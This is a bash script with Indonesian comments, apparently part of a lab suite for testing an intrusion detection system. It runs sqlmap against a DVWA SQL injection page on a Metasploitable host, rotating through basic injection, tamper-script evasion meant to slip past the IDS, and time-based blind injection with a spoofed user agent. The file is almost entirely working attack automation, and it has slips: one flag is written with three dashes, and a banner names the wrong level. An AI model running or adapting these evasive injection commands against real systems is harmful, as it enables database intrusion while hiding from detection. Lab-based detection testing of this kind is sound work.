#!/bin/bash

# =================================================================
# MODUL 04: SQL INJECTION (SQLMAP) - ROTASI PAYLOAD
# Strategi: 3 Level Depth (Basic, Obfuscation, Time-Based)
# Input: Menerima argumen $1 sebagai Nomor Ronde
# =================================================================

# Menerima Input Nomor Ronde dari Daily Round
ROUND=${1:-1} # Default ke ronde 1 jika kosong

# KONFIGURASI TARGET
TARGET_IP="192.168.113.50"   # Ganti dengan IP Metasploitable
# URL DVWA SQL Injection (Pastikan ID user ada, misal id=1)
TARGET_URL="http://$TARGET_IP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"

# PENTING: Ganti string ini dengan Cookie sesi login DVWA Anda!
# Cara dapat: Login DVWA -> F12 -> Storage -> Cookies -> PHPSESSID
COOKIE="security=low; PHPSESSID=ganti_dengan_session_id_anda"

LOG_FILE="logs/sqli_session_$(date +%F).log"

# Warna untuk Tampilan Laporan
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# =================================================================
# LOGIKA ROTASI PAYLOAD (PAYLOAD DIVERSITY)
# Mengubah Tamper Script & Opsi Tambahan berdasarkan fase ronde
# =================================================================
if [ "$ROUND" -le 10 ]; then
    # --- SET A (Ronde 1-10) ---
    # Level 2: Tamper Standard
    TAMPER_L2="space2comment,randomcase"
    DESC_L2="Tamper: Space2Comment & RandomCase"
    
    # Level 3: Default Time-Based
    EXTRA_OPTS_L3=""
    DESC_L3="Standard Time-Based"

elif [ "$ROUND" -le 20 ]; then
    # --- SET B (Ronde 11-20) ---
    # Level 2: Tamper Logic (Mengubah > jadi NOT BETWEEN)
    TAMPER_L2="between"
    DESC_L2="Tamper: Between (Logical Obfuscation)"
    
    # Level 3: Random Agent (Spoofing User-Agent)
    EXTRA_OPTS_L3="--random-agent"
    DESC_L3="Time-Based + Random User-Agent"

else
    # --- SET C (Ronde 21-30) ---
    # Level 2: Tamper Encoding (URL Encode)
    TAMPER_L2="charencode"
    DESC_L2="Tamper: CharEncode (URL Encoding)"
    
    # Level 3: Prefix Injection (Menambah kutip di awal)
    # Note: Kita escape kutipnya agar aman di command string
    EXTRA_OPTS_L3="--prefix=\"'\""
    DESC_L3="Time-Based + Payload Prefix"
fi

echo "[+] [04_SQLMAP] Memulai Modul SQL Injection..."
echo "[+] Target: $TARGET_URL"
echo "[+] Mode: Ronde $ROUND ($DESC_L2)"
echo "[+] Waktu Mulai: $(date)"

# Cek apakah Cookie sudah diganti?
if [[ "$COOKIE" == *"ganti_dengan"* ]]; then
    echo -e "${RED}[!] WARNING: Anda belum mengganti PHPSESSID di script!${NC}"
    echo -e "${RED}[!] Script mungkin gagal login ke DVWA.${NC}"
    sleep 3
fi

# -----------------------------------------------------------------
# LEVEL 1: NOISY / CLASSIC SQL INJECTION (BASELINE)
# Tujuan: Baseline. Menguji deteksi signature dasar.
# Teknik: --batch (otomatis jawab Y), tanpa teknik penyembunyian.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 1] Running Basic SQL Injection (--batch)...${NC}"

# Simpan command ke variabel (Menggunakan escape quote \" agar URL/Cookie aman)
CMD="sqlmap -u \"$TARGET_URL\" --cookie=\"$COOKIE\" --drop-set-cookie --flush-session --fresh-queries --batch --dbs"

# Tampilkan Command ke Layar
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command (Output unik per ronde)
eval $CMD > logs/sqlmap_lvl1_r${ROUND}.txt 2>&1
echo "    -> Selesai. (Harapan: Alert ET WEB_SERVER SQL Injection)"
sleep 10

# -----------------------------------------------------------------
# LEVEL 2: EVASION / TAMPER SCRIPT (DINAMIS)
# Tujuan: Mengelabui IDS dengan mengacak payload (Obfuscation).
# Teknik: Menggunakan variabel $TAMPER_L2 yang berubah tiap set ronde.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 2] Running $DESC_L2...${NC}"

# Simpan Command (Memanggil variabel $TAMPER_L2)
CMD="sqlmap -u \"$TARGET_URL\" --cookie=\"$COOKIE\" ---drop-set-cookie --flush-session --fresh-queries --batch --tamper=$TAMPER_L2 --dbs"

# Tampilkan Command
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command
eval $CMD > logs/sqlmap_lvl2_r${ROUND}.txt 2>&1
echo "    -> Selesai. (Harapan: False Negative / Alert 'Evasion')"
sleep 10

# -----------------------------------------------------------------
# LEVEL 3: TIME-BASED BLIND & HIGH RISK (DINAMIS)
# Tujuan: Menguji deteksi anomali waktu + Variasi Header/Prefix.
# Teknik: --technique=T ditambah variabel $EXTRA_OPTS_L3.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 3] Running $DESC_L3 (--level=5)...${NC}"

# Simpan Command (Memanggil variabel $EXTRA_OPTS_L3)
CMD="sqlmap -u \"$TARGET_URL\" --cookie=\"$COOKIE\" --drop-set-cookie --flush-session --fresh-queries --batch --technique=T --level=3 --risk=2 $EXTRA_OPTS_L3 --dbs"

# Tampilkan Command
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command
eval $CMD > logs/sqlmap_lvl3_r${ROUND}.txt 2>&1
echo "    -> Selesai. (Harapan: Deteksi via flow/timeout analysis)"

echo "[+] [04_SQLMAP] Modul Selesai pada $(date)"
echo "-----------------------------------------------------------"
